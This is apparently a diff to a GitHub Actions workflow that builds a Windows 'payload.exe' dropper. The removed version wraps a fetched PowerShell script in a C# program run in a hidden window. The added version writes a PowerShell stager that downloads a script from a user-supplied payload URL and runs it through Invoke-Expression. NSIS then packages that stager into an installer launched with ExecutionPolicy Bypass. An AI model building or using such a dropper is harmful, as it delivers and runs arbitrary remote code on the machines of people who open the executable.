@@ -1,4 +1,4 @@
-name: Convert PowerShell to EXE using C#
+name: Convert PowerShell to EXE using NSIS
 
 on:
   workflow_dispatch:
@@ -14,56 +14,87 @@ jobs:
 
     steps:
     # Step 1: Checkout repository
-    - name: Checkout code
+    - name: Checkout Code
       uses: actions/checkout@v3
 
-    # Step 2: Fetch the PowerShell script
-    - name: Fetch PowerShell Payload
+    # Step 2: Install NSIS
+    - name: Install NSIS
       shell: powershell
       run: |
-        Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.ps1'
-        if (!(Test-Path "payload.ps1")) { Write-Host "Payload script missing!"; exit 1 }
+        choco install nsis -y
 
-    # Step 3: Convert PowerShell script to a C# string (keeping it unchanged)
-    - name: Prepare C# source file
+    # Step 3: Save PowerShell Script with Dynamic URL Injection
+    - name: Create PowerShell Script
       shell: powershell
       run: |
-        $psCode = Get-Content -Raw -Path "payload.ps1"
-        $escapedPsCode = $psCode -replace '"', '""'  # Only escape double quotes
-        $csharpCode = @"
-        using System;
-        using System.Diagnostics;
-        using System.IO;
-
-        class Program {
-            static void Main() {
-                string psScript = @"
-        $escapedPsCode
-        ";
-                string tempFile = Path.Combine(Path.GetTempPath(), "script.ps1");
-                File.WriteAllText(tempFile, psScript);
-                Process.Start(new ProcessStartInfo {
-                    FileName = "powershell.exe",
-                    Arguments = "-ExecutionPolicy Bypass -File `" + tempFile + "`"",
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
+        $script = 'function FetchScriptContent {
+            param ([string]$scriptUrl)
+            try {
+                $response = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -TimeoutSec 10
+                return $response.Content
+            } catch {
+                Write-Host "Error: Failed to fetch data from URL - $scriptUrl"
+                return $null
             }
         }
-        "@
-        Set-Content -Path "Program.cs" -Value $csharpCode
 
-    # Step 4: Compile C# into EXE
-    - name: Compile C# to EXE
-      shell: cmd
+        function ExecuteScript {
+            param ([string]$scriptContent)
+            try {
+                Invoke-Expression $scriptContent
+            } catch {
+                Write-Host "Error: Failed to execute PowerShell command."
+            }
+        }
+
+        $scriptUrl = "' + "${{ github.event.inputs.payload_url }}" + '"
+
+        if ($scriptUrl) {
+            $scriptData = FetchScriptContent -scriptUrl $scriptUrl
+            if ($scriptData) {
+                ExecuteScript -scriptContent $scriptData
+            } else {
+                Write-Host "Error: No valid data received from the URL."
+            }
+        } else {
+            Write-Host "Error: PAYLOAD_URL is not set."
+        }'
+        
+        $script | Out-File -FilePath "payload.ps1" -Encoding utf8
+
+    # Step 4: Create NSIS Script for EXE Creation
+    - name: Generate NSIS Script
+      shell: powershell
       run: |
-        "%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:winexe /out:payload.exe Program.cs
-        if NOT EXIST payload.exe ( echo "Compilation failed!" & exit 1 )
+        $nsisScript = '
+        !define APPNAME "PayloadScript"
+        !define OUTPUT "payload.exe"
+        Outfile ${{OUTPUT}}
 
-    # Step 5: Upload the generated EXE
+        Section "Main"
+          InitPluginsDir
+          File /oname=$PLUGINSDIR\payload.ps1 payload.ps1
+          nsExec::Exec "powershell.exe -ExecutionPolicy Bypass -File $PLUGINSDIR\payload.ps1"
+        SectionEnd
+        '
+        $nsisScript | Out-File -FilePath "script.nsi" -Encoding utf8
+
+    # Step 5: Convert the PowerShell script to EXE using NSIS
+    - name: Compile NSIS Script
+      shell: powershell
+      run: makensis script.nsi
+
+    # Step 6: List the contents of the directory
+    - name: List Directory Contents
+      shell: powershell
+      run: Get-ChildItem -Path .
+
+    # Step 7: Upload the generated EXE as an artifact
     - name: Upload Executable
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
         path: payload.exe
+
 
 
